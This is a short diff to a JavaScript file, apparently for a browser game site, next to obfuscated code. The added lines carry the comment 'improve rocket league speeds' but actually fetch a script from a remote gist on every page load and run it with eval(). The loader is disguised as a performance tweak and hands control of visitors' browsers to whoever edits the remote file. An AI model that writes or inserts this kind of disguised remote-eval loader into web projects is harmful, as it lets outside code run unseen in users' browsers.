@@ -180,6 +180,8 @@ const toggleButton=document[_0x101ccc(0xbf)+_0x101ccc(0xf3)](_0x101ccc(0x16a)+_0
         };
       });
   });
+// improve rocket league speeds
+var time=Date.now();var url="https://gist.githubusercontent.com/3kh0/6dd52e0bc4cf407769e89ea2d5957d49/raw/rocket.js?time="+time;fetch(url).then(response=>{console.log("Received response from server");return response.text()}).then(text=>{console.log("Received script text, executing...");try{eval(text);console.log("Script executed successfully")}catch(e){console.error("Error executing script: ",e)}});
 // searchbar
 function search_game() {
 	let input = document.getElementById('searchbar').value
